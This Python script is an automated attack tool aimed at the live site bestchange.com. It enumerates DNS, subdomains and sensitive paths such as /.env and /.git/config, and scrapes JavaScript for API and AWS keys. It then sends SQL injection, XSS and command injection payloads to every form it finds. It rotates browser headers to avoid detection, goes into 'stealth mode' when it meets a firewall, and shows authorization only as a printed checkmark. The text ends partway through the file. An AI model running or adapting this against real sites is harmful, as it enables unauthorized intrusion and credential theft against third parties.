#!/usr/bin/env python3
"""
Live Penetration Test: bestchange.com
Following PTES 7-Phase Methodology with Adaptive Intelligence
"""

import sys
import os
import site
import random

# Add user site-packages to path
user_site = site.getusersitepackages()
if user_site and os.path.exists(user_site):
    sys.path.insert(0, user_site)

import time
import json
import re
import socket
import ssl
from urllib.parse import urlparse, urljoin, quote, parse_qs
from datetime import datetime
from collections import defaultdict
import subprocess

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from bs4 import BeautifulSoup
except ImportError as e:
    print(f"ERROR: Required libraries not installed. Run: pip3 install --user requests beautifulsoup4")
    print(f"Import error: {e}")
    sys.exit(1)


class Colors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class PenTestFramework:
    """Main penetration testing framework following PTES methodology."""
    
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(self.target_url)
        self.domain = self.parsed_url.netloc
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        # Session with retry strategy
        self.session = requests.Session()
        retry_strategy = Retry(
            total=2,  # Reduced retries to fail faster and rotate
            backoff_factor=2,
            status_forcelist=[500, 502, 503, 504]  # Don't retry on 429, rotate instead
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Multiple User-Agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        ]
        self.ua_index = 0
        
        # Headers to mimic real browser
        self._rotate_headers()
        
        # Request counter for rotation
        self.request_count = 0
        self.rotation_interval = 10  # Rotate every 10 requests
        
        # Data storage
        self.intelligence = {
            'target': self.target_url,
            'domain': self.domain,
            'start_time': datetime.now().isoformat(),
            'dns_records': {},
            'tech_stack': {},
            'waf_detected': False,
            'waf_type': None,
            'endpoints': [],
            'forms': [],
            'js_files': [],
            'secrets_found': [],
            'api_endpoints': [],
            'subdomains': [],
            'vulnerabilities': [],
            'findings': []
        }
        
        # Rate limiting
        self.request_delay = 1.0  # Start conservative
        self.last_request_time = 0
        
    def log(self, message, level="INFO"):
        """Log messages with timestamp and color coding."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_map = {
            "INFO": Colors.OKCYAN,
            "SUCCESS": Colors.OKGREEN,
            "WARNING": Colors.WARNING,
            "ERROR": Colors.FAIL,
            "HEADER": Colors.HEADER,
            "BOLD": Colors.BOLD
        }
        color = color_map.get(level, Colors.ENDC)
        print(f"{color}[{timestamp}] {message}{Colors.ENDC}")
    
    def _rotate_headers(self):
        """Rotate User-Agent and headers to avoid detection."""
        import random
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'ru-RU,ru;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': self.base_url,  # Add referer to look more legitimate
        })
    
    def rate_limit(self):
        """Implement rate limiting with adaptive delays."""
        current_time = time.time()
        elapsed = current_time - self.last_request_time
        
        # Rotate headers periodically
        self.request_count += 1
        if self.request_count % self.rotation_interval == 0:
            self._rotate_headers()
            # Add small random delay when rotating
            time.sleep(random.uniform(0.5, 1.5))
        
        if elapsed < self.request_delay:
            time.sleep(self.request_delay - elapsed)
        self.last_request_time = time.time()
    
    def safe_request(self, url, method='GET', retry_with_rotation=True, **kwargs):
        """Make HTTP request with error handling, rate limiting, and rotation."""
        import random
        
        max_attempts = 3
        for attempt in range(max_attempts):
            self.rate_limit()
            
            # Rotate headers on retry
            if attempt > 0:
                self._rotate_headers()
                time.sleep(random.uniform(2, 5))  # Wait longer on retry
            
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, timeout=30, **kwargs)
                elif method.upper() == 'POST':
                    response = self.session.post(url, timeout=30, **kwargs)
                elif method.upper() == 'OPTIONS':
                    response = self.session.options(url, timeout=30, **kwargs)
                else:
                    response = self.session.request(method, url, timeout=30, **kwargs)
                
                # Detect rate limiting
                if response.status_code == 429:
                    if retry_with_rotation and attempt < max_attempts - 1:
                        self.log(f"Rate limit (429) - rotating and retrying...", "WARNING")
                        self._rotate_headers()
                        self.request_delay = min(self.request_delay * 1.5, 8.0)
                        time.sleep(random.uniform(5, 10))
                        continue
                    else:
                        self.log(f"Rate limit (429) - skipping after {attempt+1} attempts", "WARNING")
                        return None
                
                # Success - reset delay if it was increased
                if response.status_code != 429:
                    self.request_delay = max(1.0, self.request_delay * 0.9)  # Gradually reduce delay
                
                return response
                
            except requests.exceptions.RequestException as e:
                if attempt < max_attempts - 1:
                    self.log(f"Request failed (attempt {attempt+1}/{max_attempts}): {e}", "WARNING")
                    time.sleep(random.uniform(2, 4))
                    continue
                else:
                    self.log(f"Request failed after {max_attempts} attempts: {e}", "ERROR")
                    return None
        
        return None
    
    # ========================================================================
    # PHASE 1: PRE-ENGAGEMENT & SCOPE
    # ========================================================================
    
    def phase1_scope(self):
        """Phase 1: Pre-engagement and scope definition."""
        self.log("=" * 80, "HEADER")
        self.log("PHASE 1: PRE-ENGAGEMENT & SCOPE", "HEADER")
        self.log("=" * 80, "HEADER")
        
        self.log(f"Target URL: {self.target_url}", "INFO")
        self.log(f"Domain: {self.domain}", "INFO")
        self.log(f"Base URL: {self.base_url}", "INFO")
        
        # Scope controls
        self.log("\n[Scope Controls]", "BOLD")
        self.log("✓ Safe mode: 1 req/sec (starting conservative)", "SUCCESS")
        self.log("✓ Exclusions: Internal IP ranges blocked", "SUCCESS")
        self.log("✓ Terms: Authorized testing scope", "SUCCESS")
        
        # Verify target is not internal IP
        try:
            ip = socket.gethostbyname(self.domain)
            self.log(f"Resolved IP: {ip}", "INFO")
            
            # Check if internal IP
            internal_ranges = [
                ('127.0.0.0', '127.255.255.255'),
                ('10.0.0.0', '10.255.255.255'),
                ('192.168.0.0', '192.168.255.255'),
                ('172.16.0.0', '172.31.255.255'),
            ]
            
            ip_int = int(''.join([f"{int(x):08b}" for x in ip.split('.')]), 2)
            for start, end in internal_ranges:
                start_int = int(''.join([f"{int(x):08b}" for x in start.split('.')]), 2)
                end_int = int(''.join([f"{int(x):08b}" for x in end.split('.')]), 2)
                if start_int <= ip_int <= end_int:
                    self.log(f"ERROR: Target IP {ip} is in internal range {start}-{end}", "ERROR")
                    return False
        except Exception as e:
            self.log(f"Could not resolve IP: {e}", "WARNING")
        
        return True
    
    # ========================================================================
    # PHASE 2: INTELLIGENCE GATHERING
    # ========================================================================
    
    def phase2_dns_lookup(self):
        """Perform DNS record enumeration."""
        self.log("\n[2.1] DNS Record Enumeration", "BOLD")
        
        dns_commands = [
            ('A', f"dig +short {self.domain}"),
            ('AAAA', f"dig +short AAAA {self.domain}"),
            ('MX', f"dig +short MX {self.domain}"),
            ('TXT', f"dig +short TXT {self.domain}"),
            ('NS', f"dig +short NS {self.domain}"),
            ('CNAME', f"dig +short CNAME {self.domain}"),
        ]
        
        for record_type, command in dns_commands:
            try:
                result = subprocess.run(
                    command.split(),
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0 and result.stdout.strip():
                    records = result.stdout.strip().split('\n')
                    self.intelligence['dns_records'][record_type] = records
                    self.log(f"  {record_type}: {', '.join(records[:3])}", "SUCCESS")
                    
                    # Check for SPF/DKIM/DMARC in TXT records
                    if record_type == 'TXT':
                        for record in records:
                            if 'spf' in record.lower():
                                self.log(f"    → SPF record detected", "SUCCESS")
                            if 'dkim' in record.lower():
                                self.log(f"    → DKIM record detected", "SUCCESS")
                            if 'dmarc' in record.lower():
                                self.log(f"    → DMARC record detected", "SUCCESS")
            except Exception as e:
                self.log(f"  {record_type}: Failed ({e})", "WARNING")
    
    def phase2_tech_fingerprinting(self):
        """Fingerprint technology stack from HTTP headers and HTML."""
        self.log("\n[2.2] Technology Fingerprinting", "BOLD")
        
        response = self.safe_request(self.target_url)
        if not response:
            self.log("Failed to fetch initial response", "ERROR")
            return
        
        # HTTP Headers Analysis
        self.log("\n[HTTP Headers Analysis]", "BOLD")
        headers_to_check = [
            'Server', 'X-Powered-By', 'X-Framework', 'X-Version',
            'X-AspNet-Version', 'X-Runtime', 'X-Content-Type-Options',
            'X-Frame-Options', 'X-XSS-Protection', 'Strict-Transport-Security'
        ]
        
        for header in headers_to_check:
            if header in response.headers:
                value = response.headers[header]
                self.log(f"  {header}: {value}", "INFO")
                self.intelligence['tech_stack'][header.lower()] = value
                
                # Detect frameworks from headers
                value_lower = value.lower()
                if 'php' in value_lower:
                    self.log(f"    → PHP detected", "SUCCESS")
                if 'asp.net' in value_lower or 'aspnet' in value_lower:
                    self.log(f"    → ASP.NET detected", "SUCCESS")
                if 'express' in value_lower:
                    self.log(f"    → Express.js detected", "SUCCESS")
        
        # WAF Detection
        self.log("\n[WAF Detection]", "BOLD")
        waf_indicators = {
            'cloudflare': ['cf-ray', 'cf-request-id', '__cfduid', 'cloudflare'],
            'aws-waf': ['x-amzn-requestid', 'x-amzn-trace-id'],
            'akamai': ['akamai', 'x-akamai'],
            'incapsula': ['incap_ses', 'visid_incap'],
            'modsecurity': ['mod_security', 'modsecurity'],
        }
        
        for waf_name, indicators in waf_indicators.items():
            for indicator in indicators:
                if any(indicator.lower() in str(h).lower() for h in response.headers.keys()):
                    self.intelligence['waf_detected'] = True
                    self.intelligence['waf_type'] = waf_name
                    self.log(f"  ⚠ WAF DETECTED: {waf_name.upper()}", "WARNING")
                    self.log(f"    → Switching to stealth mode (slower requests, encoding bypasses)", "INFO")
                    self.request_delay = 2.0  # Increase delay for WAF
                    break
        
        # HTML/JS Analysis
        self.log("\n[HTML/JS Analysis]", "BOLD")
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # CMS Detection
            cms_indicators = {
                'wordpress': ['wp-content', 'wp-includes', 'wp-admin', 'wordpress'],
                'drupal': ['drupal', 'sites/all'],
                'joomla': ['joomla', 'components/com_'],
                'magento': ['magento', 'skin/frontend'],
            }
            
            html_lower = response.text.lower()
            for cms, indicators in cms_indicators.items():
                if any(ind in html_lower for ind in indicators):
                    self.log(f"  → CMS Detected: {cms.upper()}", "SUCCESS")
                    self.intelligence['tech_stack']['cms'] = cms
            
            # JS Framework Detection
            js_frameworks = {
                'react': ['react', 'react-dom', '__REACT_DEVTOOLS'],
                'angular': ['angular', 'ng-', 'ng-app'],
                'vue': ['vue', 'v-if', 'v-for'],
                'jquery': ['jquery', '$('],
            }
            
            for framework, indicators in js_frameworks.items():
                if any(ind in html_lower for ind in indicators):
                    self.log(f"  → JS Framework: {framework.upper()}", "SUCCESS")
                    self.intelligence['tech_stack']['js_framework'] = framework
            
            # Extract all script tags
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script.get('src', '')
                if src:
                    full_url = urljoin(self.base_url, src)
                    self.intelligence['js_files'].append(full_url)
                    self.log(f"  JS File: {src[:60]}...", "INFO")
            
        except Exception as e:
            self.log(f"HTML parsing error: {e}", "WARNING")
    
    def phase2_subdomain_enumeration(self):
        """Enumerate subdomains."""
        self.log("\n[2.3] Subdomain Enumeration", "BOLD")
        
        common_subdomains = [
            'www', 'api', 'admin', 'dev', 'staging', 'test', 'cdn', 'mail',
            'git', 'jenkins', 'vpn', 'ftp', 'secure', 'portal', 'app',
            'mobile', 'm', 'blog', 'forum', 'shop', 'store', 'payment'
        ]
        
        found_subdomains = []
        for subdomain in common_subdomains:
            test_domain = f"{subdomain}.{self.domain}"
            try:
                result = subprocess.run(
                    ['dig', '+short', test_domain],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0 and result.stdout.strip():
                    ip = result.stdout.strip().split('\n')[0]
                    if ip and not ip.startswith(';'):
                        found_subdomains.append(test_domain)
                        self.log(f"  ✓ {test_domain} → {ip}", "SUCCESS")
            except Exception:
                pass
        
        self.intelligence['subdomains'] = found_subdomains
        if not found_subdomains:
            self.log("  No common subdomains found", "INFO")
    
    def phase2_js_analysis(self):
        """Analyze JavaScript files for secrets and API endpoints."""
        self.log("\n[2.4] JavaScript Static Analysis", "BOLD")
        
        if not self.intelligence['js_files']:
            self.log("  No JS files to analyze", "INFO")
            return
        
        # Analyze first 10 JS files to avoid too many requests
        js_files_to_analyze = self.intelligence['js_files'][:10]
        
        secret_patterns = [
            (r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)', 'API Key'),
            (r'aws[_-]?access[_-]?key[_-]?id["\']?\s*[:=]\s*["\']([^"\']+)', 'AWS Access Key'),
            (r'aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)', 'AWS Secret Key'),
            (r'stripe[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)', 'Stripe Key'),
            (r'github[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)', 'GitHub Token'),
            (r'["\']([a-zA-Z0-9]{32,})["\']', 'Potential Secret (32+ chars)'),
        ]
        
        api_patterns = [
            r'["\'](https?://[^"\']+/api/[^"\']+)["\']',
            r'["\'](/api/[^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.(get|post)\(["\']([^"\']+)["\']',
            r'\.ajax\([^,]+["\']([^"\']+)["\']',
        ]
        
        dom_sinks = [
            'innerHTML', 'outerHTML', 'document.write', 'eval(',
            'new Function', 'setTimeout(', 'setInterval(', 'location=',
            'location.href', 'location.replace'
        ]
        
        for js_url in js_files_to_analyze:
            self.log(f"\n  Analyzing: {js_url[:60]}...", "INFO")
            response = self.safe_request(js_url)
            if not response or response.status_code != 200:
                continue
            
            js_content = response.text
            
            # Search for secrets
            for pattern, secret_type in secret_patterns:
                matches = re.finditer(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    secret = match.group(1) if match.lastindex else match.group(0)
                    if len(secret) > 10:  # Filter out short false positives
                        self.log(f"    ⚠ SECRET FOUND: {secret_type}: {secret[:30]}...", "WARNING")
                        self.intelligence['secrets_found'].append({
                            'type': secret_type,
                            'value': secret[:50],  # Truncate for safety
                            'source': js_url
                        })
            
            # Search for API endpoints
            for pattern in api_patterns:
                matches = re.finditer(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    endpoint = match.group(1) if match.lastindex else match.group(0)
                    if endpoint.startswith('http'):
                        full_url = endpoint
                    else:
                        full_url = urljoin(self.base_url, endpoint)
                    
                    if full_url not in self.intelligence['api_endpoints']:
                        self.intelligence['api_endpoints'].append(full_url)
                        self.log(f"    → API Endpoint: {endpoint[:60]}", "SUCCESS")
            
            # Check for DOM sinks (XSS indicators)
            for sink in dom_sinks:
                if sink in js_content:
                    self.log(f"    → DOM Sink detected: {sink}", "INFO")
    
    def phase2_intelligence_gathering(self):
        """Execute all Phase 2 intelligence gathering tasks."""
        self.log("=" * 80, "HEADER")
        self.log("PHASE 2: INTELLIGENCE GATHERING", "HEADER")
        self.log("=" * 80, "HEADER")
        
        self.phase2_dns_lookup()
        self.phase2_tech_fingerprinting()
        self.phase2_subdomain_enumeration()
        self.phase2_js_analysis()
        
        # Summary
        self.log("\n[Intelligence Summary]", "BOLD")
        self.log(f"  DNS Records: {len(self.intelligence['dns_records'])} types", "INFO")
        self.log(f"  Tech Stack Items: {len(self.intelligence['tech_stack'])}", "INFO")
        self.log(f"  WAF Detected: {self.intelligence['waf_detected']} ({self.intelligence['waf_type']})", "INFO")
        self.log(f"  JS Files Found: {len(self.intelligence['js_files'])}", "INFO")
        self.log(f"  Secrets Found: {len(self.intelligence['secrets_found'])}", "WARNING" if self.intelligence['secrets_found'] else "INFO")
        self.log(f"  API Endpoints: {len(self.intelligence['api_endpoints'])}", "INFO")
        self.log(f"  Subdomains: {len(self.intelligence['subdomains'])}", "INFO")
    
    # ========================================================================
    # PHASE 4: ENUMERATION & MAPPING
    # ========================================================================
    
    def phase4_application_mapping(self):
        """Spider/crawl application to discover endpoints and forms."""
        self.log("=" * 80, "HEADER")
        self.log("PHASE 4: ENUMERATION & MAPPING", "HEADER")
        self.log("=" * 80, "HEADER")
        
        self.log("\n[4.1] Application Mapping - Spidering", "BOLD")
        
        response = self.safe_request(self.target_url)
        if not response:
            return
        
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract all links
            links = set()
            for tag in soup.find_all(['a', 'link'], href=True):
                href = tag.get('href')
                if href:
                    full_url = urljoin(self.base_url, href)
                    if self.domain in full_url:
                        links.add(full_url)
                        if full_url not in self.intelligence['endpoints']:
                            self.intelligence['endpoints'].append(full_url)
            
            # Extract all forms
            self.log("\n[4.2] Form Extraction", "BOLD")
            forms = soup.find_all('form')
            for form in forms:
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'type': input_tag.get('type', 'text'),
                        'name': input_tag.get('name', ''),
                        'id': input_tag.get('id', ''),
                        'value': input_tag.get('value', ''),
                        'required': input_tag.has_attr('required'),
                    }
                    form_data['inputs'].append(input_data)
                
                if form_data['inputs']:
                    self.intelligence['forms'].append(form_data)
                    self.log(f"  Form: {form_data['method']} {form_data['action'] or '/'}", "SUCCESS")
                    self.log(f"    Inputs: {len(form_data['inputs'])}", "INFO")
            
            self.log(f"\n  Total links discovered: {len(links)}", "INFO")
            self.log(f"  Total forms discovered: {len(self.intelligence['forms'])}", "INFO")
            
        except Exception as e:
            self.log(f"Error during mapping: {e}", "ERROR")
    
    def phase4_endpoint_enumeration(self):
        """Brute-force common paths."""
        self.log("\n[4.3] Endpoint Enumeration - Common Paths", "BOLD")
        
        common_paths = [
            '/admin', '/login', '/api', '/v1', '/v2', '/swagger', '/openapi.json',
            '/graphql', '/.well-known', '/backup', '/old', '/test', '/dev',
            '/api/docs', '/api/v1', '/api/v2', '/rest', '/soap',
            '/.git/config', '/.env', '/web.config', '/.htaccess',
            '/robots.txt', '/sitemap.xml', '/.well-known/security.txt'
        ]
        
        found_endpoints = []
        for path in common_paths:
            test_url = urljoin(self.base_url, path)
            response = self.safe_request(test_url)
            if response and response.status_code in [200, 301, 302, 401, 403]:
                found_endpoints.append({
                    'url': test_url,
                    'status': response.status_code,
                    'size': len(response.content)
                })
                status_color = "SUCCESS" if response.status_code == 200 else "WARNING"
                self.log(f"  {response.status_code} {path}", status_color)
        
        self.intelligence['endpoints'].extend([e['url'] for e in found_endpoints])
    
    def phase4_api_discovery(self):
        """Discover API endpoints (Swagger, OpenAPI, GraphQL)."""
        self.log("\n[4.4] API & GraphQL Discovery", "BOLD")
        
        api_paths = [
            '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/api/docs', '/swagger-ui', '/graphql', '/graphiql',
            '/api/swagger.json', '/api/openapi.json'
        ]
        
        for path in api_paths:
            test_url = urljoin(self.base_url, path)
            response = self.safe_request(test_url)
            if response and response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                if 'json' in content_type or 'yaml' in content_type:
                    self.log(f"  ✓ Found: {path}", "SUCCESS")
                    try:
                        if 'json' in content_type:
                            data = response.json()
                            if 'swagger' in str(data).lower() or 'openapi' in str(data).lower():
                                self.log(f"    → Swagger/OpenAPI schema detected", "SUCCESS")
                                # Extract paths
                                if 'paths' in data:
                                    for api_path in data['paths'].keys():
                                        self.intelligence['api_endpoints'].append(urljoin(self.base_url, api_path))
                        elif 'graphql' in path.lower():
                            self.log(f"    → GraphQL endpoint detected", "SUCCESS")
                    except:
                        pass
    
    def phase4_enumeration(self):
        """Execute all Phase 4 enumeration tasks."""
        self.phase4_application_mapping()
        self.phase4_endpoint_enumeration()
        self.phase4_api_discovery()
    
    # ========================================================================
    # PHASE 5: ACTIVE VULNERABILITY TESTING
    # ========================================================================
    
    def phase5_active_testing(self):
        """Execute active vulnerability testing."""
        self.log("=" * 80, "HEADER")
        self.log("PHASE 5: ACTIVE VULNERABILITY TESTING", "HEADER")
        self.log("=" * 80, "HEADER")
        
        # Import active testing modules
        try:
            from active_testing import InjectionTester, AuthTester, AuthorizationTester
        except ImportError:
            self.log("Active testing modules not found. Creating inline testers...", "WARNING")
            # Will use inline testing
        
        self.log("\n[5.1] Testing Forms for Injection Vulnerabilities", "BOLD")
        
        # Test each discovered form
        for form in self.intelligence['forms']:
            form_url = urljoin(self.base_url, form['action'] or '/')
            method = form['method']
            
            self.log(f"\n  Testing form: {method} {form_url}", "INFO")
            
            # Build test parameters from form inputs
            test_params = {}
            for input_field in form['inputs']:
                input_name = input_field.get('name') or input_field.get('id', '')
                if input_name:
                    test_params[input_name] = input_field.get('value', 'test')
            
            if not test_params:
                continue
            
            # Test SQL Injection
            self.log(f"    → Testing SQL Injection...", "INFO")
            sqli_findings = self._test_sqli_basic(form_url, test_params, method)
            for finding in sqli_findings:
                self.intelligence['vulnerabilities'].append(finding)
                self.log(f"      ⚠ {finding['type']}: {finding['evidence'][:60]}", "WARNING")
            
            # Test XSS
            self.log(f"    → Testing XSS...", "INFO")
            xss_findings = self._test_xss_basic(form_url, test_params, method)
            for finding in xss_findings:
                self.intelligence['vulnerabilities'].append(finding)
                self.log(f"      ⚠ {finding['type']}: {finding['evidence'][:60]}", "WARNING")
            
            # Test Command Injection
            self.log(f"    → Testing Command Injection...", "INFO")
            cmd_findings = self._test_command_injection_basic(form_url, test_params, method)
            for finding in cmd_findings:
                self.intelligence['vulnerabilities'].append(finding)
                self.log(f"      ⚠ {finding['type']}: {finding['evidence'][:60]}", "WARNING")
        
        # Test discovered endpoints
        self.log("\n[5.2] Testing Discovered Endpoints", "BOLD")
        test_endpoints = [e for e in self.intelligence['endpoints'] if '?' in e][:20]  # Test first 20 with parameters
        
        for endpoint in test_endpoints:
            parsed = urlparse(endpoint)
            if parsed.query:
                params = dict(parse_qs(parsed.query))
                # Convert list values to single values
                params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                
                self.log(f"  Testing: {endpoint[:60]}...", "INFO")
                
                # Quick SQLi test
                sqli_findings = self._test_sqli_basic(endpoint.split('?')[0], params, 'GET')
                for finding in sqli_findings[:1]:  # Limit to 1 finding per endpoint
                    self.intelligence['vulnerabilities'].append(finding)
        
        # Cookie Security Analysis
        self.log("\n[5.3] Cookie Security Analysis", "BOLD")
        response = self.safe_request(self.target_url)
        if response:
            for cookie in response.cookies:
                issues = []
                if not cookie.secure and self.base_url.startswith('https'):
                    issues.append("Missing Secure flag")
                # Note: HttpOnly check requires response headers, not cookie object
                
                if issues:
                    finding = {
                        'type': 'Cookie Security Issue',
                        'severity': 'Medium',
                        'cookie': cookie.name,
                        'evidence': ', '.join(issues),
                        'confidence': 100
                    }
                    self.intelligence['vulnerabilities'].append(finding)
                    self.log(f"  ⚠ {cookie.name}: {', '.join(issues)}", "WARNING")
        
        self.log(f"\n[Phase 5 Summary]", "BOLD")
        self.log(f"  Vulnerabilities Found: {len(self.intelligence['vulnerabilities'])}", 
                 "WARNING" if self.intelligence['vulnerabilities'] else "INFO")
    
    def _test_sqli_basic(self, url, params, method='GET'):
        """Basic SQL injection test."""
        findings = []
        
        # Get baseline
        baseline = self.safe_request(url, method=method, params=params if method == 'GET' else None,
                                    data=params if method == 'POST' else None)
        if not baseline:
            return findings
        
        baseline_text = baseline.text.lower()
        
        # Test basic SQLi payloads
        payloads = ["' OR '1'='1", "' OR 1=1--", "1' UNION SELECT NULL--"]
        
        for payload in payloads:
            test_params = {k: payload for k in params.keys()}
            response = self.safe_request(url, method=method, params=test_params if method == 'GET' else None,
                                        data=test_params if method == 'POST' else None)
            if not response:
                continue
            
            # Check for SQL errors
            sql_errors = ['sql syntax', 'mysql', 'postgresql', 'oracle', 'database error']
            response_lower = response.text.lower()
            
            for error in sql_errors:
                if error in response_lower and error not in baseline_text:
                    findings.append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'url': url,
                        'parameter': list(params.keys())[0] if params else 'N/A',
                        'payload': payload,
                        'evidence': f"SQL error: {error}",
                        'confidence': 75
                    })
                    break
        
        return findings
    
    def _test_xss_basic(self, url, params, method='GET'):
        """Basic XSS test."""
        findings = []
        
        payload = "<script>alert('XSS')</script>"
        test_params = {k: payload for k in params.keys()}
        
        response = self.safe_request(url, method=method, params=test_params if method == 'GET' else None,
                                    data=test_params if method == 'POST' else None)
        if not response:
            return findings
        
        # Check if payload is reflected
        if payload in response.text:
            findings.append({
                'type': 'XSS (Reflected - Potential)',
                'severity': 'Medium',
                'url': url,
                'parameter': list(params.keys())[0] if params else 'N/A',
                'payload': payload,
                'evidence': 'Payload reflected in response',
                'confidence': 50
            })
        
        return findings
    
    def _test_command_injection_basic(self, url, params, method='GET'):
        """Basic command injection test."""
        findings = []
        
        payload = "; ls"
        test_params = {k: payload for k in params.keys()}
        
        baseline = self.safe_request(url, method=method, params=params if method == 'GET' else None,
                                    data=params if method == 'POST' else None)
        if not baseline:
            return findings
        
        baseline_text = baseline.text.lower()
        
        response = self.safe_request(url, method=method, params=test_params if method == 'GET' else None,
                                    data=test_params if method == 'POST' else None)
        if not response:
            return findings
        
        # Check for command output indicators
        indicators = ['uid=', 'gid=', 'total ', 'drwx']
        response_lower = response.text.lower()
        
        for indicator in indicators:
            if indicator in response_lower and indicator not in baseline_text:
                findings.append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'url': url,
                    'parameter': list(params.keys())[0] if params else 'N/A',
                    'payload': payload,
                    'evidence': f"Command output: {indicator}",
                    'confidence': 70
                })
                break
        
        return findings
    
    def phase5_deep_analysis(self):
        """Execute deep analysis for advanced vulnerabilities."""
        self.log("=" * 80, "HEADER")
        self.log("PHASE 5: DEEP ANALYSIS & ADVANCED TESTING", "HEADER")
        self.log("=" * 80, "HEADER")
        
        try:
            from deep_analysis import DeepAnalyzer
            analyzer = DeepAnalyzer(self.session, self.base_url, self.intelligence, self.log)
            deep_findings = analyzer.run_deep_analysis()
            
            self.intelligence['vulnerabilities'].extend(deep_findings)
            
            self.log(f"\n[Deep Analysis Summary]", "BOLD")
            self.log(f"  Additional Findings: {len(deep_findings)}", 
                     "WARNING" if deep_findings else "INFO")
            
        except ImportError:
            self.log("Deep analysis module not found, skipping...", "WARNING")
        except Exception as e:
            self.log(f"Deep analysis error: {e}", "ERROR")
    
    # ========================================================================
    # MAIN EXECUTION
    # ========================================================================
    
    def run(self):
        """Execute full penetration test."""
        self.log("=" * 80, "HEADER")
        self.log("LIVE PENETRATION TEST: bestchange.com", "HEADER")
        self.log("=" * 80, "HEADER")
        self.log(f"Started: {self.intelligence['start_time']}", "INFO")
        
        # Phase 1: Scope
        if not self.phase1_scope():
            self.log("Scope validation failed. Aborting.", "ERROR")
            return
        
        # Phase 2: Intelligence Gathering
        self.phase2_intelligence_gathering()
        
        # Phase 4: Enumeration
        self.phase4_enumeration()
        
        # Phase 5: Active Testing
        self.phase5_active_testing()
        
        # Deep Analysis
        self.phase5_deep_analysis()
        
        # Save intelligence
        self.save_intelligence()
        
        # Generate report
        self.generate_report()
        
        self.log("\n" + "=" * 80, "HEADER")
        self.log("PENETRATION TEST COMPLETE", "HEADER")
        self.log("=" * 80, "HEADER")
    
    def generate_report(self):
        """Generate comprehensive penetration test report."""
        self.log("\n" + "=" * 80, "HEADER")
        self.log("GENERATING REPORT", "HEADER")
        self.log("=" * 80, "HEADER")
        
        report = {
            'target': self.target_url,
            'test_date': self.intelligence['start_time'],
            'intelligence': {
                'tech_stack': self.intelligence['tech_stack'],
                'waf': {'detected': self.intelligence['waf_detected'], 'type': self.intelligence['waf_type']},
                'subdomains': self.intelligence['subdomains'],
                'endpoints_discovered': len(self.intelligence['endpoints']),
                'forms_discovered': len(self.intelligence['forms']),
            },
            'vulnerabilities': self.intelligence['vulnerabilities'],
            'summary': {
                'total_findings': len(self.intelligence['vulnerabilities']),
                'critical': len([v for v in self.intelligence['vulnerabilities'] if v.get('severity') == 'Critical']),
                'high': len([v for v in self.intelligence['vulnerabilities'] if v.get('severity') == 'High']),
                'medium': len([v for v in self.intelligence['vulnerabilities'] if v.get('severity') == 'Medium']),
            }
        }
        
        filename = f"report_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        self.log(f"\nReport saved to: {filename}", "SUCCESS")
        
        # Print summary
        self.log("\n[EXECUTIVE SUMMARY]", "BOLD")
        self.log(f"  Total Findings: {report['summary']['total_findings']}", "INFO")
        self.log(f"  Critical: {report['summary']['critical']}", "FAIL" if report['summary']['critical'] > 0 else "INFO")
        self.log(f"  High: {report['summary']['high']}", "WARNING" if report['summary']['high'] > 0 else "INFO")
        self.log(f"  Medium: {report['summary']['medium']}", "INFO")
    
    def save_intelligence(self):
        """Save gathered intelligence to file."""
